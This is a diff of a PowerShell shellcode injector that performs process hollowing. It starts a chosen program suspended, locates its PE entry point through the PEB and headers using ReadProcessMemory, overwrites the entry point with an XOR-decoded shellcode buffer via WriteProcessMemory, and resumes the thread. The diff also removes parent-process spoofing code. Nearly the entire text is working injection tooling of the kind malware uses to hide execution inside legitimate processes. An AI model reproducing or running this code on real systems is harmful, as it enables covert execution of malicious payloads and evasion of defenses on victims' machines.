-        $WriteProcessMemory = Load-Win32Function -Library "Kernel32.dll" -FunctionName "WriteProcessMemory" -ParamTypes $WriteProcMemArgs -ReturnType ([Bool]) -Debug $Debug
-        Write-Host ' o  Function ' -NoNewline ; Write-Host "'Kernel32!WriteProcessMemory()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
+        $WriteProcessMemory = Load-Win32Function -Library "Kernel32.dll" -FunctionName "WriteProcessMemory" -ParamTypes $WriteProcMemArgs -ReturnType ([Bool])
 
         $ResThreadArgs = @(
             [IntPtr] # hThread
         )
-        $ResumeThread = Load-Win32Function -Library "Kernel32.dll" -FunctionName "ResumeThread" -ParamTypes $ResThreadArgs -ReturnType ([UInt32]) -Debug $Debug
-        Write-Host ' o  Function ' -NoNewline ; Write-Host "'Kernel32!ResumeThread()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
-        
-        # PPID Spoofing
-        $OpenProcArgs = @(
-            [UInt32], # dwDesiredAccess
-            [Bool],   # bInheritHandle
-            [UInt32]  # dwProcessId
-        )
-        $OpenProcess = Load-Win32Function -Library "Kernel32.dll" -FunctionName "OpenProcess" -ParamTypes $OpenProcArgs -ReturnType ([IntPtr]) -Debug $Debug
-        Write-Host ' o  Function ' -NoNewline ; Write-Host "'Kernel32!OpenProcess()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
+        $ResumeThread = Load-Win32Function -Library "Kernel32.dll" -FunctionName "ResumeThread" -ParamTypes $ResThreadArgs -ReturnType ([UInt32])
 
+        # Sanity Check
+        $Win32Funcs = @('CreateProcessA','NtQueryInformationProcess','ReadProcessMemory','WriteProcessMemory','ResumeThread')
+        $Win32Funcs | % { if ((Get-Variable -Name $_ -ValueOnly 2>$NULL) -isnot [Delegate]) { 
+                return (Write-Host '[!] Error! Failed to load Win32 API calls.' -ForegroundColor Red)
+            }
+        }
     }
     Catch { return Generic-Error }
 
 
-    ### Initialize Key Variables / Enums for later API Calls
+    ### Initialize Key Variables ###
 
-    # Reference: https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
-    $AccessRights = @{
-        PROCESS_ALL_ACCESS        = 0x000F0000 -bor 0x00100000 -bor 0xFFFF;
-        PROCESS_CREATE_THREAD     = 0x0002;
-        PROCESS_QUERY_INFORMATION = 0x0400;
-        PROCESS_VM_OPERATION      = 0x0008;
-        PROCESS_VM_READ           = 0x0010;
-        PROCESS_VM_WRITE          = 0x0020;
-    }
-    # Reference: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
-    $MemoryAllocation = @{
-        MEM_COMMIT  = 0x00001000;
-        MEM_RESERVE = 0x00002000;
-    }
-    # Reference: https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
-    $MemoryProtection = @{
-        PAGE_EXECUTE           = 0x10;
-        PAGE_READWRITE         = 0x04;
-        PAGE_EXECUTE_READWRITE = 0x40;
-    }
-    # Reference: https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
-    $CreationFlags = @{
-        CREATE_SUSPENDED             = 0x00000004;
-        CREATE_NO_WINDOWS            = 0x08000000;
-        EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
-    }
-    # Reference: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
-    $StartupFlags = @{
-        STARTF_USESTDHANDLES = 0x00000100;
-        STARTF_USESHOWWINDOW = 0x00000001;
-    }
-    # Reference: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
-    $ProcThreadFlags = @{
-        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    = 0x00020000;
-        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
-    }
+    # Parameter Processing
+    if (Test-Path -LiteralPath $CreateProcess 2>$NULL) { $CreateProcess = (Get-Item -LiteralPath $CreateProcess).FullName }
+    else                                               { $CreateProcess = (Get-Command -Name $CreateProcess).Path         }
 
+    [byte[]]$ShellcodeBuffer = Format-ByteArray $Shellcode -XorKey $XorKey -UseProxy $UseProxy
+    if ($ShellcodeBuffer -isnot [byte[]]) { return }
 
-    ### (1) Create Target Process in a Suspended State
+    
+    ### (1) Create Target Process in a Suspended State ###
 
     Write-Host "[!] Creating target process..." -ForegroundColor Yellow
 
@@ -517,34 +464,29 @@
     #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
 
     # Argument(s)
-    $lpApplicationName    = $CreateProcess                            # Name of the application to be executed (full path).
+    $lpApplicationName    = $CreateProcess                            # Full path of the application to be executed.
     $lpCommandLine        = "${CreateProcess} ${ProcessArgs}"         # Command line arguments to be executed  (full path + optional arguments).
-    $lpProcessAttributes  = [ref]$ProcessAttributes                   # Pointer to a SECURITY_ATTRIBUTES struct that determines if the returned process handle can be inherited.
-    $lpThreadAttributes   = [ref]$ThreadAttributes                    # Pointer to a SECURITY_ATTRIBUTES struct that determines if the returned thread handle can be inherited.
-    $bInheritHandles      = $False                                    # Boolean for if 
-    $dwCreationFlags      = $CreationFlags.CREATE_SUSPENDED           # 
-    $lpEnvironment        = [IntPtr]::Zero                            #
-    $lpCurrentDirectory   = $(Split-Path -LiteralPath $CreateProcess) # 
-    $lpStartupInfo        = [ref]$StartupInfo                         # 
-    $lpProcessInformation = [ref]$ProcessInformation                  # 
+    $lpProcessAttributes  = [ref]$ProcessAttributes                   # Pointer to a SECURITY_ATTRIBUTES struct (for the process).
+    $lpThreadAttributes   = [ref]$ThreadAttributes                    # Pointer to a SECURITY_ATTRIBUTES struct (for the thread).
+    $bInheritHandles      = $False                                    # Boolean for new process to inherit handles from calling process.  
+    $dwCreationFlags      = $CreationFlags.CREATE_SUSPENDED           # New process creation flags (i.e., create in suspended state).
+    $lpEnvironment        = [IntPtr]::Zero                            # Pointer to the environment block for the new process.
+    $lpCurrentDirectory   = $(Split-Path -LiteralPath $CreateProcess) # Full path to the current directory for the process.
+    $lpStartupInfo        = [ref]$StartupInfo                         # Pointer to STARTUPINFOA struct.
+    $lpProcessInformation = [ref]$ProcessInformation                  # Pointer to PROCESS_INFORMATION struct.
 
-    Try {
-        $Success = $CreateProcessA.Invoke($lpApplicationName, $lpCommandLine, $lpProcessAttributes, $lpThreadAttributes, $bInheritHandles, $dwCreationFlags, $lpEnvironment, $lpCurrentDirectory, $lpStartupInfo, $lpProcessInformation)
+    Write-Host ' o  ' -NoNewline ; Write-Host 'CreateProcessA()' -ForegroundColor Green
 
-        Write-Host ' o  ' -NoNewline ; Write-Host 'CreateProcessA()' -ForegroundColor Green
-        if ($Success) {
-
-            $RetProcessInformation = $lpProcessInformation.Value
-
-            Write-Host " o  --> Process Path : ${CreateProcess}"
-            Write-Host " o  --> Process PID  : $($RetProcessInformation.dwProcessId)"
-        }
-        else { Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red }
-    }
+    Try   { $Success = $CreateProcessA.Invoke($lpApplicationName, $lpCommandLine, $lpProcessAttributes, $lpThreadAttributes, $bInheritHandles, $dwCreationFlags, $lpEnvironment, $lpCurrentDirectory, $lpStartupInfo, $lpProcessInformation) }
     Catch { return Generic-Error }
 
+    if (!$Success) { return Win32-Error }
+    $RetProcessInformation = $lpProcessInformation.Value
+    Write-Host " o  --> Process Path : ${CreateProcess}"
+    Write-Host " o  --> Process PID  : $($RetProcessInformation.dwProcessId)"
+
     
-    ### (2) Parse the Process Enviroment Block (PEB) of the Suspended Process
+    ### (2) Parse the Process Enviroment Block (PEB) of the Suspended Process ###
 
     Write-Host "[!] Parsing the Created Process' Process Environment Block (PEB)..." -ForegroundColor Yellow 
 
@@ -561,21 +503,18 @@
     $ProcessInformationLength = [IntPtr]::Size * 6              # Size of the 'ProcessInformation' buffer                               (i.e., 48 bytes).
     $ReturnLength             = 0                               # Output buffer to receive the size of the requested information buffer (i.e., hopefully 48 bytes).
 
-    Try {
-        $NTSTATUS_INT = $NtQueryInformationProcess.Invoke($ProcessHandle, $ProcessInformationClass, $ProcessInformation, $ProcessInformationLength, [ref]$ReturnLength)
+    Write-Host ' o  ' -NoNewline ; Write-Host 'NtQueryInformationProcess()' -ForegroundColor Green
 
-        Write-Host ' o  ' -NoNewline ; Write-Host 'NtQueryInformationProcess()' -ForegroundColor Green
-
-        $ImageBaseAddrPtr = [Int64]$ProcessBasicInformation.PebAddress + 0x10 # Pointer to beginning of PE file (i.e. IMAGE_DOS_HEADER)
-
-        Write-Host " o  --> Process Environment Block (PEB) Address : $(Print-Hex $ProcessBasicInformation.PebAddress)"
-        Write-Host " o  --> Image Base Address Pointer (PEB + 0x10) : $(Print-Hex $ImageBaseAddrPtr)"
-
-    }
+    Try   { $NTSTATUS_INT = $NtQueryInformationProcess.Invoke($ProcessHandle, $ProcessInformationClass, $ProcessInformation, $ProcessInformationLength, [ref]$ReturnLength) }
     Catch { return Generic-Error }
 
+    if ($NTSTATUS_INT -ne 0) { return Win32-Error }
+    $ImageBaseAddrPtr = [Int64]$ProcessBasicInformation.PebAddress + 0x10 # Pointer to beginning of PE file (i.e. IMAGE_DOS_HEADER)
+    Write-Host " o  --> Process Environment Block (PEB) Address : $(Print-Hex $ProcessBasicInformation.PebAddress)"
+    Write-Host " o  --> Image Base Address Pointer (PEB + 0x10) : $(Print-Hex $ImageBaseAddrPtr)"
 
-    ### (3) Acquire Offsets from the Image Base Address
+
+    ### (3) Acquire Offsets from the Image Base Address ###
 
     Write-Host "[!] Acquiring the Image Base Address..." -ForegroundColor Yellow
 
@@ -585,28 +524,23 @@
     #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
 
     # Argument(s)
-    $hProcess            = $RetProcessInformation.hProcess                              # Handle to the target process
+    $hProcess            = $RetProcessInformation.hProcess                # Handle to the target process
     $lpBaseAddress       = $ImageBaseAddrPtr                              # Starting address to begin reading.
     $lpBuffer            = [Array]::CreateInstance([byte],[IntPtr]::Size) # Buffer to receive contents (e.g., 8-byte memory address)
     $nSize               = $lpBuffer.Length                               # Size of the buffer
     $lpNumberOfBytesRead = [ref]0                                         # Number of bytes successfully read
 
-    Try {
-        $Success = $ReadProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, $lpNumberOfBytesRead)
+    Write-Host ' o  ' -NoNewline ; Write-Host 'ReadProcessMemory()' -ForegroundColor Green
 
-        if ($Success) {
-            Write-Host ' o  ' -NoNewline ; Write-Host 'ReadProcessMemory()' -ForegroundColor Green
-
-            [IntPtr]$ImageBaseAddress = [BitConverter]::ToInt64($lpBuffer,0) # Image Base Address (8-bytes) located at beginning of PE
-
-            Write-Host " o  --> Image Base Address (IBA) : $(Print-Hex $ImageBaseAddress)"
-        }
-        else { Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red }
-    }
+    Try   { $Success = $ReadProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, $lpNumberOfBytesRead) }
     Catch { return Generic-Error }
 
+    if (!$Success) { return Win32-Error }
+    [IntPtr]$ImageBaseAddress = [BitConverter]::ToInt64($lpBuffer,0) # Image Base Address (8-bytes) located at beginning of PE
+    Write-Host " o  --> Image Base Address (IBA) : $(Print-Hex $ImageBaseAddress)"
 
-    ### (4) Determine Relative Virtual Address Offsets
+
+    ### (4) Determine Relative Virtual Address Offsets ###
 
     Write-Host "[!] Determining Offsets to acquire PE EntryPoint..." -ForegroundColor Yellow
 
@@ -622,31 +556,27 @@
     $nSize               = $lpBuffer.Length                      # Size of the buffer
     $lpNumberOfBytesRead = [ref]0                                # Number of bytes successfully read
 
-    Try {
-        $Success = $ReadProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, $lpNumberOfBytesRead)
+    Write-Host ' o  ' -NoNewline ; Write-Host 'ReadProcessMemory()' -ForegroundColor Green
 
-        if ($Success) {
-            Write-Host ' o  ' -NoNewline ; Write-Host 'ReadProcessMemory()' -ForegroundColor Green
-
-            $PE_Data  = $lpBuffer                                         # First 0x200 (512-bytes) of PE
-            $e_lfanew = [UInt32]([BitConverter]::ToInt32($PE_Data, 0x3c)) # NT Header Offset (4-bytes) located at offset "0x3c"
-
-            $RVA_Ptr  = $e_lfanew + 0x28
-            $RVA      = [UInt32]([BitConverter]::ToInt32($PE_Data, $RVA_Ptr)) # Relative Virtual Address (4-bytes) located at offset "$e_lfanew + 0x28"
-
-            $EntryPointAddr = [IntPtr]($ImageBaseAddress.ToInt64() + $RVA)
-
-            Write-Host " o  --> PE Structure Bytes Read        : ${nSize} bytes"
-            Write-Host " o  --> e_lfanew (Offset to NT Header) : $(Print-Hex $e_lfanew)"
-            Write-Host " o  --> Relative Virtual Address (RVA) : $(Print-Hex $RVA)"
-            Write-Host " o  --> PE EntryPoint (IBA + RVA)      : $(Print-Hex $EntryPointAddr)"
-        }
-        else { Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red }
-    }
+    Try   { $Success = $ReadProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, $lpNumberOfBytesRead) }
     Catch { return Generic-Error }
 
+    if (!$Success) { return Win32-Error }
 
-    ### (5) Write Shellcode to PE Entrypoint
+    $PE_Data  = $lpBuffer                                             # First 0x200 (512-bytes) of PE
+    $e_lfanew = [UInt32]([BitConverter]::ToInt32($PE_Data, 0x3c))     # NT Header Offset (4-bytes) located at offset "0x3c"
+    $RVA_Ptr  = $e_lfanew + 0x28
+    $RVA      = [UInt32]([BitConverter]::ToInt32($PE_Data, $RVA_Ptr)) # Relative Virtual Address (4-bytes) located at offset "$e_lfanew + 0x28"
+
+    $EntryPointAddr = [IntPtr]($ImageBaseAddress.ToInt64() + $RVA)
+
+    Write-Host " o  --> PE Structure Bytes Read        : ${nSize} bytes"
+    Write-Host " o  --> e_lfanew (Offset to NT Header) : $(Print-Hex $e_lfanew)"
+    Write-Host " o  --> Relative Virtual Address (RVA) : $(Print-Hex $RVA)"
+    Write-Host " o  --> PE EntryPoint (IBA + RVA)      : $(Print-Hex $EntryPointAddr)"
+
+
+    ### (5) Write Shellcode to PE Entrypoint ###
 
     Write-Host "[!] Writing Shellcode to PE Entrypoint..." -ForegroundColor Yellow
 
@@ -662,19 +592,16 @@
     $nSize               = $ShellcodeBuffer.Length          # Size of the buffer
     $lpNumberOfBytesRead = [ref]0                           # Number of bytes successfully read
 
-    Try {
-        $Success = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, $lpNumberOfBytesRead)
+    Write-Host ' o  ' -NoNewline ; Write-Host 'WriteProcessMemory()' -ForegroundColor Green
 
-        if ($Success) {
-            Write-Host ' o  ' -NoNewline ; Write-Host 'WriteProcessMemory()' -ForegroundColor Green
-            Write-Host " o  --> Shellcode Bytes Written : ${nSize} bytes"
-        }
-        else { Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red }
-    }
+    Try   { $Success = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, $lpNumberOfBytesRead) }
     Catch { return Generic-Error }
 
+    if (!$Success) { return Win32-Error }
+    Write-Host " o  --> Shellcode Bytes Written : ${nSize} bytes"
 
-    ### Optional: Debug Mode to Attach to Process
+
+    ### Optional: Debug Mode to Attach to Process ###
 
     if ($Debug) {
         
@@ -682,14 +609,13 @@
 
         Write-Host "[x] Debug: " -NoNewline -ForegroundColor Magenta
         Write-Host 'Attach to the ' -NoNewline ; Write-Host "'$($TargetProcess.ProcessName)' ($($TargetProcess.Id))" -ForegroundColor Green -NoNewline ; Write-Host ' instance.'
-
         Write-Host ' o  --> Shellcode located at address : ' -NoNewline ; Write-Host $(Print-Hex $EntryPointAddr) -ForegroundColor Green
         Write-Host ' o  --> ' -NoNewline ; Write-Host 'PRESS ENTER TO EXECUTE SHELLCODE.' -ForegroundColor Red -NoNewline
         $NULL = Read-Host
     }
 
 
-    ### (6) Resume Thread and Execute Shellcode
+    ### (6) Resume Thread and Execute Shellcode ###
 
     Write-Host "[!] Resuming process execution..." -ForegroundColor Yellow
 
@@ -699,39 +625,36 @@
     #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
 
     # Argument(s)
-    $hThread = $RetProcessInformation.hThread
+    $hThread = $RetProcessInformation.hThread  # Handle to the target thread.
 
-    Try {
-        $Success = $ResumeThread.Invoke($hThread)
+    Write-Host ' o  ' -NoNewline ; Write-Host 'ResumeThread()' -ForegroundColor Green
 
-        if ($Success -eq 1) {
-            Write-Host ' o  ' -NoNewline ; Write-Host 'ResumeThread()' -ForegroundColor Green
-            Write-Host " o  --> Thread Handle : ${hThread}"
-        }
-        else { Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red }
-    }
+    Try   { $Success = $ResumeThread.Invoke($hThread) }
     Catch { return Generic-Error }
 
+    if ($Success -ne 1) { return Win32-Error }     
+    Write-Host " o  --> Thread Handle : ${hThread}"
 
-    ############
 
-    # Order of Operations (64-bit):
-    #
-    # --> Starting Address     : Process Environment Block (PEB) Address           | $ProcessBasicInformation.PebAddress
-    # --> add 0x10 (16-bytes)  : Pointer to Image Base Address                     | $ImageBaseAddrPtr
-    #   = save addr            : 8-byte Address to Image Base Address              | $ImageBaseAddress
-    #
-    # --> Starting Address     : Image Base Address                                | $ImageBaseAddress
-    # --> to 0x200 (512-bytes) : Entirety of PE Header (save to 512-byte buffer)   | $PE_Data
-    # --> add 0x3c (60-bytes)  : Pointer to e_lfanew                               | $e_lfanewPtr
-    #   = save addr            : 4-byte value of e_lfanew (offset to NT/PE Header) | $e_lfanew
-    #
-    # --> Starting Address     : e_lfanew value (offset to NT/PE Header)           | $e_lfanew
-    # --> add 0x28 (40-bytes)  : Pointer to Relative Virtual Address (RVA)         | $RVA_Ptr
-    #   = save addr            : 4-byte RVA                                        | $RVA
-    # 
-    # --> Starting Address     : Image Base Address (again)                        | $RVA
-    # --> add $RVA             : Entrypoint Address                                | $EntrypointAddr
+    <#
 
-    #############
+    Process Hollowing - Order of Operations (64-bit):
+    
+     >  Starting Address     : Process Environment Block (PEB) Address           ($ProcessBasicInformation.PebAddress)
+     >  add 0x10 (16-bytes)  : Pointer to Image Base Address                     ($ImageBaseAddrPtr)
+     =  save addr            : 8-byte Address to Image Base Address              ($ImageBaseAddress)
+    
+     >  Starting Address     : Image Base Address                                ($ImageBaseAddress)
+     >  to 0x200 (512-bytes) : Entirety of PE Header (save to 512-byte buffer)   ($PE_Data)
+     >  add 0x3c (60-bytes)  : Pointer to e_lfanew                               ($e_lfanewPtr)
+     =  save addr            : 4-byte value of e_lfanew (offset to NT/PE Header) ($e_lfanew)
+    
+     >  Starting Address     : e_lfanew value (offset to NT/PE Header)           ($e_lfanew)
+     >  add 0x28 (40-bytes)  : Pointer to Relative Virtual Address (RVA)         ($RVA_Ptr)
+     =  save addr            : 4-byte RVA                                        ($RVA)
+     
+     >  Starting Address     : Image Base Address (again)                        ($RVA)
+     >  add 4-byte RVA       : Entrypoint Address                                ($EntrypointAddr)
+
+    #>
 }
